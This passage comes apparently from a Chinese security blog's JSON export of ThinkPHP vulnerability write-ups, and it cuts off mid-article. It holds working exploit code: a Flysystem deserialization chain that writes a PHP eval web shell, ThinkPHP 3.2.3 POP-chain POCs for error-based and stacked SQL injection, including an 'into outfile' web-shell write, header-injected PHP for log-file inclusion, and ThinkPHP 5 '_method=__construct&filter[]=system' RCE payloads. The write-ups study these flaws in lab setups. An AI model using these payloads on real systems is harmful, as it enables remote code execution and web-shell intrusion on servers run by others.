class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">$this</span>-&gt;file=<span class=\"string\">&quot;cys2.php&quot;</span>;  <span class=\"comment\">//文件名称</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">$this</span>-&gt;complete=<span class=\"string\">&quot;&lt;?php eval(\\$_POST[a]);?&gt;&quot;</span>;  <span class=\"comment\">//内容</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">$this</span>-&gt;adapter=<span class=\"keyword\">new</span> \\League\\Flysystem\\Adapter\\Local();  <span class=\"comment\">//has()方法</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;\t</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">League</span>\\<span class=\"title\">Flysystem</span>\\<span class=\"title\">Adapter</span>&#123;</span><br><span class=\"line\">\t<span class=\"title\">class</span> <span class=\"title\">Local</span> <span class=\"title\">extends</span> <span class=\"title\">AbstractAdapter</span>&#123;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"title\">abstract</span> <span class=\"title\">class</span> <span class=\"title\">AbstractAdapter</span>&#123;</span><br><span class=\"line\">\t\tprotected $pathPrefix = &quot;./&quot;;  //这里进行目录的更改</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span>&#123;</span><br><span class=\"line\">\t$<span class=\"title\">a</span> = <span class=\"title\">new</span> \\<span class=\"title\">League</span>\\<span class=\"title\">Flysystem</span>\\<span class=\"title\">Cached</span>\\<span class=\"title\">Storage</span>\\<span class=\"title\">Adapter</span>();</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> urlencode(serialize(<span class=\"variable\">$a</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在/public目录下生成cys.php</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/e9f4eb5a48034b07b64b7c99bb4f750c.png\"></p>\n<h1 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h1><p>全局搜索 __destruct()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/38e48dbce15c402799399ffe0873195c.png\"></p>\n<p>在src/Storage/AbstractCache.php</p>\n<blockquote>\n<p>abstract class AbstractCache implements CacheInterface</p>\n</blockquote>\n<p>如果autosave为false则执行save()函数</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/e023c40b7d504fe0a1d7435e66f33110.png\"></p>\n<p>搜索当前文件没有发现save()函数，看到当前类为抽象类，搜索谁继承了当前类</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/02e0c73c739e4d908278702cc69deea5.png\"></p>\n<p>在src/Storage/Adapter.php 发现save()函数</p>\n<blockquote>\n<p>class Adapter extends AbstractCache</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/a5346184f4c441ddb0e1cda4e9a4aa30.png\"></p>\n<p>跟进getForStorage()函数</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/055bc28d0684404c8b2645c99e273716.png\"></p>\n<p>发现参数<code>cache</code> <code>complete</code> 和方法<code>cleanContents()</code>在抽象类中, <code>expire</code>在当前类中</p>\n<p>跟进cleanContents()发现没什么用，那么在save()函数中<code>$contents参数我们可控</code></p>\n<p>接下来进行一个has()方法的判断，我们肯定是想进行write()方法，那么has()就要返回一个false</p>\n<p>搜索has()方法，在src/Adapter/Local.php</p>\n<blockquote>\n<p>class Local extends AbstractAdapter</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/87b342723e834acb8e1c54b56ebb9876.png\"></p>\n<p>在它的抽象类中跟进到applyPathPrefix()</p>\n<p>src/Adapter/AbstractAdapter.php</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/ac077b965cff41f2bb4576bfe2d60bd9.png\"></p>\n<p>跟进getPathPrefix()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/11a4dcae58e14fbfa014d700eb2dddd8.png\"></p>\n<p>这里的<code>pathPrefix可控</code>，让pathPrefix为 <code>./</code> 再配合ltrim可以控制任意写入文件的目录地址</p>\n<p>ltrim意思是去除  <code>\\</code>  最终返回到has()的 <code>file_exists($location)</code> 因为这里的<code>$location</code>是我们写入的文件名: <code>./cys.php</code>不存在，所以返回false</p>\n<p>然后向上返回到write()函数，写入一句话</p>\n","categories":["ThinkPHP漏洞集合"]},{"title":"ThinkPHP 3.2.3 反序列化&sql注入漏洞分析","url":"/2023/12/25/ThinkPHP3.2.3%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","content":"<h1 id=\"漏洞概述\"><a href=\"#漏洞概述\" class=\"headerlink\" title=\"漏洞概述\"></a>漏洞概述</h1><p>反序列化链利用分析  <a href=\"https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA?fileGuid=YQ6W8dWWxRpgCVkt\">ThinkPHP v3.2.* （SQL注入&amp;文件读取）反序列化POP链</a></p>\n<h1 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h1><p>控制器写入</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">Home</span>\\<span class=\"title\">Controller</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Think</span>\\<span class=\"title\">Controller</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">IndexController</span> <span class=\"keyword\">extends</span> <span class=\"title\">Controller</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">index</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    unserialize(base64_decode(<span class=\"variable\">$_GET</span>[<span class=\"number\">1</span>]));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n\n<h1 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h1><p>可实现<code>报错注入</code>和 <code>MySQL恶意服务端读取客户端文件</code> 和 <code>写shell</code></p>\n<p>POC：因为PDO默认是支持多语句查询的，所以这个点是可以堆叠注入的</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">namespace Think\\Db\\Driver&#123;</span><br><span class=\"line\">    use PDO;</span><br><span class=\"line\">    class Mysql&#123;</span><br><span class=\"line\">        protected $options &#x3D; array(</span><br><span class=\"line\">            PDO::MYSQL_ATTR_LOCAL_INFILE &#x3D;&gt; true    </span><br><span class=\"line\">        );</span><br><span class=\"line\">        protected $config &#x3D; array(</span><br><span class=\"line\">            &quot;debug&quot;    &#x3D;&gt; 1,</span><br><span class=\"line\">            &quot;database&quot; &#x3D;&gt; &quot;thinkphp&quot;,</span><br><span class=\"line\">            &quot;hostname&quot; &#x3D;&gt; &quot;127.0.0.1&quot;,</span><br><span class=\"line\">            &quot;hostport&quot; &#x3D;&gt; &quot;3306&quot;,</span><br><span class=\"line\">            &quot;charset&quot;  &#x3D;&gt; &quot;utf8&quot;,</span><br><span class=\"line\">            &quot;username&quot; &#x3D;&gt; &quot;root&quot;,</span><br><span class=\"line\">            &quot;password&quot; &#x3D;&gt; &quot;root&quot;</span><br><span class=\"line\">        );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">namespace Think\\Image\\Driver&#123;</span><br><span class=\"line\">    use Think\\Session\\Driver\\Memcache;</span><br><span class=\"line\">    class Imagick&#123;</span><br><span class=\"line\">        private $img;</span><br><span class=\"line\"></span><br><span class=\"line\">        public function __construct()&#123;</span><br><span class=\"line\">            $this-&gt;img &#x3D; new Memcache();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">namespace Think\\Session\\Driver&#123;</span><br><span class=\"line\">    use Think\\Model;</span><br><span class=\"line\">    class Memcache&#123;</span><br><span class=\"line\">        protected $handle;</span><br><span class=\"line\"></span><br><span class=\"line\">        public function __construct()&#123;</span><br><span class=\"line\">            $this-&gt;handle &#x3D; new Model();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">namespace Think&#123;</span><br><span class=\"line\">    use Think\\Db\\Driver\\Mysql;</span><br><span class=\"line\">    class Model&#123;</span><br><span class=\"line\">        protected $options   &#x3D; array();</span><br><span class=\"line\">        protected $pk;</span><br><span class=\"line\">        protected $data &#x3D; array();</span><br><span class=\"line\">        protected $db &#x3D; null;</span><br><span class=\"line\"></span><br><span class=\"line\">        public function __construct()&#123;</span><br><span class=\"line\">            $this-&gt;db &#x3D; new Mysql();</span><br><span class=\"line\">            $this-&gt;options[&#39;where&#39;] &#x3D; &#39;&#39;;</span><br><span class=\"line\">            $this-&gt;pk &#x3D; &#39;id&#39;;</span><br><span class=\"line\">            $this-&gt;data[$this-&gt;pk] &#x3D; array(</span><br><span class=\"line\">                &quot;table&quot; &#x3D;&gt; &quot;mysql.user where 1&#x3D;updatexml(1,concat(0x7e,user()),0x7e)#&quot;,</span><br><span class=\"line\">                &quot;where&quot; &#x3D;&gt; &quot;1&#x3D;1&quot;</span><br><span class=\"line\">            );</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">namespace &#123;</span><br><span class=\"line\">    echo base64_encode(serialize(new Think\\Image\\Driver\\Imagick()));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">写 shell</span><br><span class=\"line\">&quot;table&quot;&#x3D;&gt;&quot;mysql.users where 1&#x3D;2;select \\&quot;&lt;?php eval(\\$_POST[0]);?&gt;\\&quot; into outfile \\&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php\\&quot;#&quot;,</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/2dd8d569f41b45239ea2729044ed6920.png\"></p>\n<p>如果关闭了堆叠注入</p>\n<p>PDO加上了<code>PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; true, //</code></p>\n<p>就可以把堆叠开了，再给个poc</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">namespace Think\\Image\\Driver&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    use Think\\Session\\Driver\\Memcache;</span><br><span class=\"line\"></span><br><span class=\"line\">    class Imagick</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        private $img;</span><br><span class=\"line\"></span><br><span class=\"line\">        public function __construct()</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            $this-&gt;img &#x3D; new Memcache();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">namespace Think\\Session\\Driver&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    use Think\\Model;</span><br><span class=\"line\"></span><br><span class=\"line\">    class Memcache</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        protected $handle;</span><br><span class=\"line\">        public function __construct()&#123;</span><br><span class=\"line\">            $this-&gt;handle &#x3D; new Model();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">namespace Think &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    use Think\\Db\\Driver\\Mysql;</span><br><span class=\"line\"></span><br><span class=\"line\">    class Model</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        protected $pk;</span><br><span class=\"line\">        protected $db;</span><br><span class=\"line\">        protected $data;</span><br><span class=\"line\">        public function __construct()&#123;</span><br><span class=\"line\">            $this-&gt;pk &#x3D; &#39;id&#39;;</span><br><span class=\"line\">            $this-&gt;data[$this-&gt;pk] &#x3D; array(</span><br><span class=\"line\">                &#39;where&#39;&#x3D;&gt;&#39;1&#x3D;1&#39;,</span><br><span class=\"line\">                &#39;table&#39;&#x3D;&gt;&#39;Users where 1&#x3D;updatexml(1,concat(0x7e,database(),0x7e),1)#&#39;</span><br><span class=\"line\">            );</span><br><span class=\"line\">            $this-&gt;db &#x3D; new Mysql();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">namespace Think\\Db\\Driver&#123;</span><br><span class=\"line\">    use PDO;</span><br><span class=\"line\">    class Mysql</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        protected $config     &#x3D; array(</span><br><span class=\"line\">            &#39;type&#39;              &#x3D;&gt;  &#39;mysql&#39;,     &#x2F;&#x2F; 数据库类型</span><br><span class=\"line\">            &#39;hostname&#39;          &#x3D;&gt;  &#39;127.0.0.1&#39;, &#x2F;&#x2F; 服务器地址</span><br><span class=\"line\">            &#39;database&#39;          &#x3D;&gt;  &#39;ctfshow&#39;,          &#x2F;&#x2F; 数据库名</span><br><span class=\"line\">            &#39;username&#39;          &#x3D;&gt;  &#39;root&#39;,      &#x2F;&#x2F; 用户名</span><br><span class=\"line\">            &#39;password&#39;          &#x3D;&gt;  &#39;root&#39;,          &#x2F;&#x2F; 密码</span><br><span class=\"line\">            &#39;hostport&#39;          &#x3D;&gt;  &#39;3306&#39;,        &#x2F;&#x2F; 端口</span><br><span class=\"line\">            &#39;dsn&#39;               &#x3D;&gt;  &#39;&#39;, &#x2F;&#x2F;</span><br><span class=\"line\">            &#39;params&#39;            &#x3D;&gt;  array(), &#x2F;&#x2F; 数据库连接参数</span><br><span class=\"line\">            &#39;charset&#39;           &#x3D;&gt;  &#39;utf8&#39;,      &#x2F;&#x2F; 数据库编码默认采用utf8</span><br><span class=\"line\">            &#39;prefix&#39;            &#x3D;&gt;  &#39;&#39;,    &#x2F;&#x2F; 数据库表前缀</span><br><span class=\"line\">            &#39;debug&#39;             &#x3D;&gt;  true, &#x2F;&#x2F; 数据库调试模式</span><br><span class=\"line\">            &#39;deploy&#39;            &#x3D;&gt;  0, &#x2F;&#x2F; 数据库部署方式:0 集中式(单一服务器),1 分布式(主从服务器)</span><br><span class=\"line\">            &#39;rw_separate&#39;       &#x3D;&gt;  false,       &#x2F;&#x2F; 数据库读写是否分离 主从式有效</span><br><span class=\"line\">            &#39;master_num&#39;        &#x3D;&gt;  1, &#x2F;&#x2F; 读写分离后 主服务器数量</span><br><span class=\"line\">            &#39;slave_no&#39;          &#x3D;&gt;  &#39;&#39;, &#x2F;&#x2F; 指定从服务器序号</span><br><span class=\"line\">            &#39;db_like_fields&#39;    &#x3D;&gt;  &#39;&#39;,</span><br><span class=\"line\">        );</span><br><span class=\"line\">        protected $options &#x3D; array(</span><br><span class=\"line\">            PDO::ATTR_CASE              &#x3D;&gt;  PDO::CASE_LOWER,</span><br><span class=\"line\">            PDO::ATTR_ERRMODE           &#x3D;&gt;  PDO::ERRMODE_EXCEPTION,</span><br><span class=\"line\">            PDO::ATTR_ORACLE_NULLS      &#x3D;&gt;  PDO::NULL_NATURAL,</span><br><span class=\"line\">            PDO::ATTR_STRINGIFY_FETCHES &#x3D;&gt;  false,</span><br><span class=\"line\">            PDO::MYSQL_ATTR_LOCAL_INFILE &#x3D;&gt; true,    &#x2F;&#x2F;读取本地文件~</span><br><span class=\"line\">            PDO::MYSQL_ATTR_MULTI_STATEMENTS &#x3D;&gt; true,    &#x2F;&#x2F;把堆叠开了~</span><br><span class=\"line\">        );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">namespace &#123;</span><br><span class=\"line\">    echo base64_encode(serialize(new \\Think\\Image\\Driver\\Imagick()));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h1><p><strong>跳板1</strong></p>\n<blockquote>\n<p>ThinkPHP/Library/Think/Image/Driver/Imagick.class.php</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/53b16f9eaea54bd7a2e994079779de0f.png\"></p>\n<p>首先参数$this-&gt;img可控，去寻找destroy()方法</p>\n<p><strong>跳板2</strong></p>\n<blockquote>\n<p>ThinkPHP/Library/Think/Session/Driver/Memcache.class.php</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/970785ea81e440f78b0ca7702590aa98.png\"></p>\n<p><code>$this-&gt;handle</code>，<code>$this-&gt;sessionName</code>可控，这里注意，跳板1调用destroy时是无参调用，在php5环境下可以运行，在php7环境下不能运行</p>\n<p><strong>跳板3</strong></p>\n<p>接着寻找delete()方法</p>\n<blockquote>\n<p>ThinkPHP/Mode/Lite/Model.class.php</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/dd777dc2478c4ef6b6e456a934c3f2be.png\"></p>\n<p>走到<strong>最后利用处</strong></p>\n<blockquote>\n<p>/ThinkPHP/Library/Think/Db/Driver.class.php</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/f2a3c90e42324ab8ac186d28137cb21e.png\"></p>\n<p>看看这个parseTable</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/85a13b5d32af4f0894887cf7ce9c06aa.png\"></p>\n<p>不管是数组还是字符串都进行parseKey方法进行处理</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/419995f496854091869752ecf7d3b705.png\"></p>\n<p>直接返回，所以说什么过滤都没有</p>\n<p>再跟进<code>execute()</code>方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/b500ab2c4c3544f8a97cad515dfdcea2.png\"></p>\n<p>跟进</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/3f6ca41a80ed45ce82e7bb4ee5c84c31.png\"></p>\n<p>跟进</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/940041bec4064514a8e6db9aed40f696.png\" alt=\"在这里插入图片描述\"></p>\n<p>这里控制 <code>$this-&gt;config</code> 来连接数据库。</p>\n<p><code>driver类时抽象类，用mysql类来实例化</code></p>\n","categories":["ThinkPHP漏洞集合"]},{"title":"Thinkphp5日志文件包含trick","url":"/2023/12/25/Thinkphp5%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABtrick/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>Thinkphp5日志文件包含trick，一种对日志进行文件包含的利用方式</p>\n<h1 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h1><ul>\n<li><p>thinkphp5.0.24 变量覆盖rce修复版本，不在未开启强制路由rce影响版本</p>\n</li>\n<li><p>未开启app_debug</p>\n</li>\n</ul>\n<h1 id=\"利用条件\"><a href=\"#利用条件\" class=\"headerlink\" title=\"利用条件\"></a>利用条件</h1><ul>\n<li>日志路径</li>\n<li>包含点</li>\n</ul>\n<a id=\"more\"></a>\n\n<h1 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h1><p>控制器写入一个可以触发错误的方法，发现传入的php代码会进行url编码</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/7e7fefff8cf84ceda4432ee192b1de63.png\"></p>\n<p>跟进日志相关函数</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/17265923ff8242759873122a9f9abaf4.png\"></p>\n<p>四个相关函数进行分析，ip：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/825b139ce7304ebfa86fba6a964e77c2.png\"></p>\n<p>ip可以用XFF HCI RA等字段，但是最后有检测合法性，ip2long检测ip为无效返回false，最后设置ip为0.0.0.0</p>\n<p>method：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/6edb962f15164bc890a7f2a797c27f4a.png\"></p>\n<p>这里并没有进行过滤，但是最后返回的是大写 <strong>HTTP_X_HTTP_METHOD_OVERRIDE</strong></p>\n<p>host：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/3a440416791344adaf5bfdffedda2549.png\"></p>\n<p>直接返回 <strong>HTTP_X_REAL_HOST</strong></p>\n<p>url：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/65706dd8a1ca4506b90200720bfc7e48.png\"></p>\n<p>返回 <strong>HTTP_X_REWRITE_URL</strong></p>\n<p>添加头部信息</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">X-REAL-HOST: &lt;?php phpinfo();?&gt;</span><br><span class=\"line\">X-REWRITE-URL: &lt;?php phpinfo();?&gt;</span><br><span class=\"line\">X-HTTP-METHOD-OVERRIDE: &lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/6465490eba48496aa40803aeecbf73da.png\"></p>\n<p>包含日志文件</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/8ad4e75cf0784137aba6773af31d5e6e.png\"></p>\n","categories":["ThinkPHP漏洞集合"]},{"title":"ThinkPHPv5 RCE改造","url":"/2023/12/25/ThinkPHPv5%20RCE%E6%94%B9%E9%80%A0/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/61d3b175fc59857902b38c34d3aff324.png\" alt=\"image-20220425100627897\"></p>\n<a id=\"more\"></a>\n\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>看到一篇文章  <a href=\"https://xz.aliyun.com/t/11189\">TP5 RCE利用链改造 - 先知社区 </a> 觉得挺有意思的，吐槽下：看了一下自己以前写的TP文章，太拉跨了，有空重新写一遍</p>\n<p>改造后版本影响 5.0.8-5.0.23</p>\n<h1 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h1><ul>\n<li>WIN11</li>\n<li>php7.3.4</li>\n<li>TPv5.0.23</li>\n</ul>\n<h1 id=\"回顾\"><a href=\"#回顾\" class=\"headerlink\" title=\"回顾\"></a>回顾</h1><h2 id=\"开启debug\"><a href=\"#开启debug\" class=\"headerlink\" title=\"开启debug\"></a>开启debug</h2><p>先贴个payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">_method&#x3D;__construct&amp;method&#x3D;GET&amp;filter[]&#x3D;system&amp;get[]&#x3D;whoami</span><br><span class=\"line\">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;whoami(比较通用)</span><br></pre></td></tr></table></figure>\n\n<p>TP5的RCE的原因就是因为在Request类中的method方法可以调用当前类的任意方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/3f3b14df706d8fbf2e0d22d697e0dc99.png\" alt=\"image-20220424223030239\"></p>\n<p>调用了<strong>__construct</strong>方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/0c5917ab68e20677aa9c7869f041a859.png\" alt=\"image-20220424223149773\"></p>\n<p>覆盖了参数 <strong>method=GET、filter=array(‘system’)、get=array(‘whoami’)</strong> 这是construct最重要的作用：覆盖参数</p>\n<p>然后走到了filterValue</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/c5ba66df304519cd97282a125b4cd53d.png\" alt=\"image-20220424225459956\"></p>\n<p>然后触发rce</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/af0bcb9ed00b222f01fbffc25ac56d35.png\" alt=\"image-20220424225556774\"></p>\n<p>整体流程为：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/61d3b175fc59857902b38c34d3aff324.png\" alt=\"image-20220425100627897\"></p>\n<p>补充：</p>\n<p>还可以这样的payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;127.0.0.1&#x2F;public&#x2F;?a&#x3D;whoami</span><br><span class=\"line\">_method&#x3D;__construct&amp;filter[]&#x3D;system</span><br></pre></td></tr></table></figure>\n\n<p>因为在二次进入input时，调用get()，然后参数合并</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/e7d7ca334b16bd35937e318095e73e31.png\" alt=\"image-20220425140620991\"></p>\n<p>所以当没有覆盖$this-&gt;get时，会去获取url中的值</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/e97c7de17c37aab18cd18902ad6216d3.png\"></p>\n<h2 id=\"未开启debug\"><a href=\"#未开启debug\" class=\"headerlink\" title=\"未开启debug\"></a>未开启debug</h2><p>未开启debug情况下跟 captcha 验证码有分不开的联系，环境配置如下，composer引入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">composer require topthink&#x2F;think-captcha 1.*</span><br></pre></td></tr></table></figure>\n\n<p>application/config.php添加</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;captcha&#x27;</span>  =&gt; [</span><br><span class=\"line\">        <span class=\"comment\">// 验证码字符集合</span></span><br><span class=\"line\">        <span class=\"string\">&#x27;codeSet&#x27;</span>  =&gt; <span class=\"string\">&#x27;2345678abcdefhijkmnpqrstuvwxyzABCDEFGHJKLMNPQRTUVWXY&#x27;</span>,</span><br><span class=\"line\">        <span class=\"comment\">// 验证码字体大小(px)，根据所需进行设置验证码字体大小</span></span><br><span class=\"line\">        <span class=\"string\">&#x27;fontSize&#x27;</span> =&gt; <span class=\"number\">30</span>,</span><br><span class=\"line\">        <span class=\"comment\">// 是否画混淆曲线</span></span><br><span class=\"line\">        <span class=\"string\">&#x27;useCurve&#x27;</span> =&gt; <span class=\"literal\">true</span>,</span><br><span class=\"line\">        <span class=\"comment\">// 验证码图片高度，根据所需进行设置高度</span></span><br><span class=\"line\">        <span class=\"string\">&#x27;imageH&#x27;</span>   =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">        <span class=\"comment\">// 验证码图片宽度，根据所需进行设置宽度</span></span><br><span class=\"line\">        <span class=\"string\">&#x27;imageW&#x27;</span>   =&gt; <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">        <span class=\"comment\">// 验证码位数，根据所需设置验证码位数</span></span><br><span class=\"line\">        <span class=\"string\">&#x27;length&#x27;</span>   =&gt; <span class=\"number\">4</span>,</span><br><span class=\"line\">        <span class=\"comment\">// 验证成功后是否重置</span></span><br><span class=\"line\">        <span class=\"string\">&#x27;reset&#x27;</span>    =&gt; <span class=\"literal\">true</span></span><br><span class=\"line\">    ],</span><br></pre></td></tr></table></figure>\n\n<p>先给出正常的poc</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;127.0.0.1&#x2F;public&#x2F;index.php?s&#x3D;captcha</span><br><span class=\"line\">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;whoami</span><br></pre></td></tr></table></figure>\n\n<p>经过 <strong>__construct()覆盖后返回到run()**，需要注意的是请求的路由是 **?s=captcha</strong>，它对应的注册规则为 <strong>\\think\\Route::get</strong>。在method方法结束后，返回值应为get，所以在 <strong>__construct()</strong> 覆盖值为<strong>get</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/c3b8019453bd948976b41a1fdd93c0b7.png\" alt=\"image-20220425163033274\"></p>\n<p>captcha路由对应的**$dispatch[‘type’]=method**，这里进入下面的exec()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/2b9e592598dcbe9177419d4c07023ea0.png\" 